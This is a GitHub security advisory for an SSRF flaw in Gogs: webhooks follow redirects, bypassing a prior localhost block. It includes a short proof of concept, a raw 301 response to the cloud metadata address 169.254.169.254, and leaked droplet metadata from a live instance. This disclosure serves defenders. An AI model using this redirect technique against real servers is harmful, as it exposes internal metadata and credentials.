# [H] Gogs has SSRF in webhook deliveries

## Summary
Severity: High
Advisory: GHSA-c4v7-xg93-qf8g
CVE: CVE-2026-47267
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-c4v7-xg93-qf8g
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.14.3

## Details
### Summary
The fix for  CVE-2022-1285 prevents adding webooks or running webhooks with URLs with a hostname that resolves in localCIDRs. However, webhooks still follow redirects allowing to access hostname inside localCIDRs.

This was already communicated in the initial report but it looks like there was a bit of a miscommunication.

### Details

By creating a webook pointing to any URL that will return the following:

```
HTTP/1.1 301 Moved Permanently
Location: http://169.254.169.254/metadata/v1.json
Content-Length: 0
Connection: close
```
It is possible to access 169.254.169.254

### PoC

1. Run netcat on any server
2. Use this server as the webhook URL
3. Once you get the request from the webhook (for example by testing it), copy the response above

Results from running this on try.gogs:

```
{"droplet_id":456901166,"hostname":"gogs-do-nyc3-01","vendor_data":"Content-Type: multipart/mixed; boundary=\"===============8645434374073493512==\"\nMIME-Version: 1.0\n\n--===============8645434374073493512==\nMIME-Version: 1.0\nContent-Type: text/cloud-config; charset=\"us-ascii\"\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"cloud-config\"\n\n#cloud-config\n\n# Enable root and password auth\ndisable_roo...{"dhcp_enabled":false,"vpc_peering_enabled":false},"dotty_status":"running","ssh_info":{"port":22}}
```

### Impact
Server Side Request Forgery

### Fix

The "simplest way" to fix it is most likely to leverage Client.CheckRedirect https://pkg.go.dev/net/http#hdr-Clients_and_Transports to check if the redirect is pointing to a blocked hostname

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-c4v7-xg93-qf8g
- https://nvd.nist.gov/vuln/detail/CVE-2026-47267
- https://github.com/gogs/gogs/pull/8263
- https://github.com/gogs/gogs/commit/199cf4fd5bbe40b92f6dc8d649e241fd7a8d0018
- https://github.com/gogs/gogs
